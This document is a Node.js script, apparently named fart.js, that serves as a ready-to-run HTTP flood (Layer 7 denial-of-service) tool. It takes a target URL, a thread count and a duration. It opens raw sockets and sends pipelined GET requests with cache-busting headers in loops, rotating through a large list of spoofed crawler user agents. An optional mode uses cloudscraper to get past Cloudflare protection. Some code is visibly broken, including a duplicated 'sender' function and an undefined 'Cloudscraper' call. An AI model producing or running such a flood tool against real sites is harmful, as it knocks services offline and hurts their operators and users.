const cloudscraper = require('cloudscraper');
const net = require('net');
const http = require('http');
const https = require('https');
const { URL } = require('url');
const { v4: uuidv4 } = require('uuid');
const dns = require('dns');

const userAgents = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; /;www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; /;www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; ;help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; /;duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; /;www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (PlayStanion; PS3; rv:98.7) Preload/44322 Browser/39.0",
    "Mozilla/5.0 (compatible; YandexBot/3.0; /;",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; /;ahrefs.com/robot/)",
    "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; ;mj12bot.com/)",
    "Mozilla/5.0 (compatible; SemrushBot/7~bl; /;www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; Applebot/0.1; /;www.apple.com/go/applebot)",
    "Mozilla/5.0 (compatible; Twitterbot/1.0)",
    "Mozilla/5.0 (compatible; Pinterestbot/1.0; /;www.pinterest.com/bot.html)",
    "Mozilla/5.0 (compatible; Discordbot/2.0; /https://discord.com)",
    "Mozilla/5.0 (compatible; Slackbot/1.0; /https://api.slack.com/robots)",
    "Mozilla/5.0 (compatible; LinkedInbot/1.0; /;www.linkedin.com/bot.html)",
    "Mozilla/5.0 (compatible; SkypeUriPreview Preview/0.5; /https://dev.skype.com/)",
    "Mozilla/5.0 (compatible; WhatsAppbot/1.0; /https://www.whatsapp.com/)",
    "Mozilla/5.0 (compatible; TelegramBot/1.0; /https://telegram.org/)",
    "Mozilla/5.0 (compatible; Discordbot/2.0; /https://discordapp.com)",
    "Mozilla/5.0 (compatible; Snapchatbot/1.0; /https://www.snapchat.com/)",
    "Mozilla/5.0 (compatible; Viberbot/1.0; /https://www.viber.com/)",
    "Mozilla/5.0 (compatible; Pinterestbot/1.0; /https://developers.pinterest.com/docs/api/)",
    "Mozilla/5.0 (compatible; LINEbot/1.0; /;line.me)",
    "Mozilla/5.0 (compatible; Tumblrbot/1.0; /;www.tumblr.com/)",
    "Mozilla/5.0 (compatible; Qwantify/2.2w; /https://www.qwant.com/)",
    "Mozilla/5.0 (compatible; Qwantify/2.2w; /https://www.qwant.com/)",
    "Mozilla/5.0 (compatible; Pinterestbot/1.0; /https://www.pinterest.com/bot.html)",
    "Mozilla/5.0 (compatible; Pinterestbot/1.0; /;www.pinterest.com/bot.html)",
    "Mozilla/5.0 (compatible; WhatsAppbot/1.0; /;www.whatsapp.com/cidr/whatsappbot)",
    "Mozilla/5.0 (compatible; AhrefsBot/6.1; /;ahrefs.com/robot/)",
    "Mozilla/5.0 (compatible; SemrushBot/3~bl; /;www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; YandexMetrika/2.0; /;",
    "Mozilla/5.0 (compatible; DomainStatsBot/1.0; /https://domainstats.com/pages/our-bot)",
    "Mozilla/5.0 (compatible; SemrushBot/3/BA; /;www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; BLEXBot/1.0; /;webmeup-crawler.com/)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; /;www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Pinterestbot/1.0; /;www.pinterest.com/bot.html)",
    "Mozilla/5.0 (compatible; SemrushBot-SI/0.97; /;www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; /;www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; /",
    "Mozilla/5.0 (compatible; AhrefsBot/6.1; /;ahrefs.com/robot/)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; /;www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Pinterestbot/1.0; /https://developers.pinterest.com/docs/api/)",
    "Mozilla/5.0 (compatible; Qwantify/2.2w; /https://www.qwant.com/)",
    "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; ;mj12bot.com/)",
    "Mozilla/5.0 (compatible; SemrushBot/3/BA; /;www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; /;www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; BLEXBot/1.0; /;webmeup-crawler.com/)",
    "Mozilla/5.0 (compatible; Qwantify/2.2w; /;www.qwant.com/)",
    "Mozilla/5.0 (compatible; Qwantify/2.2w; /;www.qwant.com/)",  
    "Mozilla/5.0 (compatible; Googlebot/2.1; /;www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; /;www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; ;help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; /;duckduckgo.com/duckduckbot.html)",  
    "Mozilla/5.0 (compatible; Baiduspider/2.0; /;www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; /",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; /;ahrefs.com/robot/)",
    "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; ;mj12bot.com/)",
    "Mozilla/5.0 (compatible; SemrushBot/7~bl; /;www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; Applebot/0.1; /;www.apple.com/go/applebot)",
    "Mozilla/5.0 (compatible; Twitterbot/1.0)",
    "Mozilla/5.0 (compatible; Pinterestbot/1.0; /;www.pinterest.com/bot.html)",
    "Mozilla/5.0 (compatible; Discordbot/2.0; /;discord.com)",
    "Mozilla/5.0 (compatible; Slackbot/1.0; /;api.slack.com/robots)",  
    "Mozilla/5.0 (compatible; LinkedInbot/1.0; /;www.linkedin.com/bot.html)",
    "Mozilla/5.0 (compatible; SkypeUriPreview Preview/0.5; /;dev.skype.com/)",
    "Mozilla/5.0 (compatible; WhatsAppbot/1.0; /;www.whatsapp.com/)",
    "Mozilla/5.0 (compatible; TelegramBot/1.0; /;telegram.org/)",
    "Mozilla/5.0 (compatible; Discordbot/2.0; /;discordapp.com)",
    "Mozilla/5.0 (compatible; Snapchatbot/1.0; /;www.snapchat.com/)",
    "Mozilla/5.0 (compatible; Viberbot/1.0; /;www.viber.com/)",
    "Mozilla/5.0 (compatible; Pinterestbot/1.0; /;developers.pinterest.com/docs/api/)",
    "Mozilla/5.0 (compatible; LINEbot/1.0; /;line.me)",
    "Mozilla/5.0 (compatible; Tumblrbot/1.0; /;www.tumblr.com/)",
    "Mozilla/5.0 (compatible; Qwantify/2.2w; /;www.qwant.com/)",
    "Mozilla/5.0 (compatible; Qwantify/2.2w; /;www.qwant.com/)",
    "Mozilla/5.0 (compatible; Pinterestbot/1.0; /;www.pinterest.com/bot.html)",
    "Mozilla/5.0 (compatible; Pinterestbot/1.0; /;www.pinterest.com/bot.html)",
    "Mozilla/5.0 (compatible; WhatsAppbot/1.0; /;www.whatsapp.com/cidr/whatsappbot)",
    "Mozilla/5.0 (compatible; AhrefsBot/6.1; /;ahrefs.com/robot/)",
    "Mozilla/5.0 (Discord; fart.js/king) Ver/1.01 (KHTML, like Gecko) Version/7.1 GETCOOKIE/1.0",
    "Mozilla/5.0 (compatible; YandexMetrika/2.0; /;",
    "Mozilla/5.0 (compatible; AhrefsBot/6.1; /;ahrefs.com/robot/)",
    "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:15.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/6.2; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+",
    "Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412.EU",
    "Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H143 Safari/600.1.4",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:39.0) Gecko/20100101 Firefox/39.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321",
    "Mozilla/5.0 (iPad; CPU OS 7_0_3 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B511 Safari/9537.53",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10"
];

const method = "GET";
const vals = [...'abcdefghijklmnopqrstuvwxyz0123456789'];
let randsemilla = "";

for (let i = 0; i < 30; i++) {
    randsemilla += vals[Math.floor(Math.random() * vals.length)];
}

function socker(remote, port) {
    return new Promise((resolve, reject) => {
        const socket = new net.Socket();
        socket.connect(port, remote, () => {
            resolve(socket);
        });
        socket.on('error', (err) => {
            reject(err);
        });
    });
}

async function getResolvedIP(hostname) {
    return new Promise((resolve, reject) => {
        dns.lookup(hostname, (err, address) => {
            if (err) reject(err);
            else resolve(address);
        });
    });
}

async function sender(max, ip, time, useCloudscraper) {
    const end_time = time ? Date.now() + time * 1000 : undefined;

    while (!end_time || Date.now() < end_time) {
        let packet = "";

        const ports = [80, 443];
        let sock;

        for (const port of ports) {
            try {
                sock = new net.Socket();
                await new Promise((resolve, reject) => {
                    sock.connect(port, ip, () => {
                        resolve();
                    });
                    sock.on('error', (err) => {
                        reject(err);
                    });
                });
                break;
            } catch (err) {
                console.log("\n[CONNECT-ERROR] Unable to connect:", err.message, "\n");
                sock.destroy(); 
            }
        }

        if (!sock) {
            continue; 
        }

        for (let i = 0; i < max; i++) {
            const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
            if (!userAgent) {
                console.log("[ERROR] NO AGENTS FOUND");
                break;
            } // why are you so fucking slow

            packet += `${method} / HTTP/1.1\r\nHost: ${ip}\r\nUser-Agent: ${userAgent}\r\nIf-None-Match: ${randsemilla}\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n`; 
        }
        packet = packet.replace(/Connection: Keep-Alive\r\n\r\n$/, 'Connection: Close\r\n\r\n');
        
        if (useCloudscraper) {
            Cloudscraper({
                url: 'http://' + ip,
                method: 'GET',
                headers: {
                    'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                    'Content-Length': 0,
                }
            });
        } else {
            sock.write(packet);
        }
    }
}
async function senderWithCloudscraper(max, url, time) {
    const end_time = time ? Date.now() + time * 1000 : undefined;

    while (!end_time || Date.now() < end_time) {
        try {
            await cloudscraper.get(url);
           // console.log("Request sent successfully");
        } catch (err) {
            console.log("\n[CONNECT-ERROR] Unable to connect:", err.message, "\n");
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
}

async function sender(max, url, time, useCloudscraper) {
    if (useCloudscraper) {
        await senderWithCloudscraper(max, url, time);
    } else {
        const { hostname } = new URL(url);
        let ip;
        try {
            ip = await getResolvedIP(hostname); // fuck me now
        } catch (err) {
            console.error("DNS FAILED:", err);
            return;
        }

        const end_time = time ? Date.now() + time * 1000 : undefined;

        while (!end_time || Date.now() < end_time) {
            let packet = "";

            const ports = [443];
            let sock;

            for (const port of ports) {
                try {
                    sock = new net.Socket();
                    await new Promise((resolve, reject) => {
                        sock.connect(port, ip, () => {
                            resolve();
                        });
                        sock.on('error', (err) => {
                            reject(err);
                        });
                    });
                    break;
                } catch (err) {
                    console.log("\n[CONNECT-ERROR] Unable to connect:", err.message, "\n");
                    sock.destroy(); 
                }
            }

            if (!sock) {
                continue; 
            }

            for (let i = 0; i < max; i++) {
                const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
                if (!userAgent) {
                    console.log("[ERROR] NO AGENTS FOUND");
                    break;
                }

                packet += `${method} / HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: ${userAgent}\r\nIf-None-Match: ${randsemilla}\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n`; 
            }
            packet = packet.replace(/Connection: Keep-Alive\r\n\r\n$/, 'Connection: Close\r\n\r\n');
            
            sock.write(packet);
        }
    }
}

async function layer7(url, max, time, useCloudscraper) {
    console.log("URL:", url);
    console.log("Max threads:", max);
    console.log("Time:", time);
    console.log("Using Cloudscraper:", useCloudscraper);

    if (useCloudscraper) {
        console.log("Target URL:", url, "\n");
    } else {
        const { hostname } = new URL(url);
        let ip;
        try {
            ip = await getResolvedIP(hostname);
        } catch (err) {
            console.error("DNS FAILED:", err);
            return;
        }

        console.log("Target IP:", ip, "\n");
    }

    for (let v = 0; v < max; v++) {
        sender(max, url, time, useCloudscraper);
    }

    console.log("[-] Launched!");
    console.log("[!] Connected");
    console.log("[?] Get kissed :3"); // cute
    if (time) setTimeout(() => {}, time * 1000);
}

const args = process.argv.slice(2);
if (args.length >= 3) {
    const [url, max, time, useCloudscraperArg] = args;
    const useCloudscraper = useCloudscraperArg && useCloudscraperArg.toLowerCase() === 'cf';
    layer7(url, max, time, useCloudscraper);
} else {
    console.log("Usage: node fart.js [url] [threads] [time] [cf (optional)]");
}

